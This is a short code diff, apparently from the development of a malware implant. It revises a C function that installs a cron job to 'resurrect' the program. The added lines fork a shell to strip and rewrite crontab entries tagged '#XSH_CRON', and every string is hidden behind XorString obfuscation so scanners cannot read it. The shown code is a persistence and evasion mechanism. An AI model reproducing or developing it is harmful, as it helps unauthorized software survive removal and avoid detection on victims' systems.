@@ -202,7 +202,19 @@ static void install_cron_resurrect()
     }
 
     if (found)
-        return; /* 已安装，不重复添加 */
+    {
+        /* 已有旧规则，先清除再重写（旧版可能用 pgrep，需要更新为 PID 文件方案） */
+        char rm_cmd[256];
+        snprintf(rm_cmd, sizeof(rm_cmd), "%s",
+            XorString("crontab -l 2>/dev/null | grep -v '#XSH_CRON' | crontab -"));
+        pid_t rm = fork();
+        if (rm == 0)
+        {
+            execl(XorString("/bin/sh"), XorString("sh"), XorString("-c"), rm_cmd, NULL);
+            _exit(127);
+        }
+        if (rm > 0) usleep(500000); /* 等旧规则清除 */
+    }
 
     /* 构建 crontab 命令：用 fork+exec 替代 system()，不触碰 SIGCHLD */
     /*
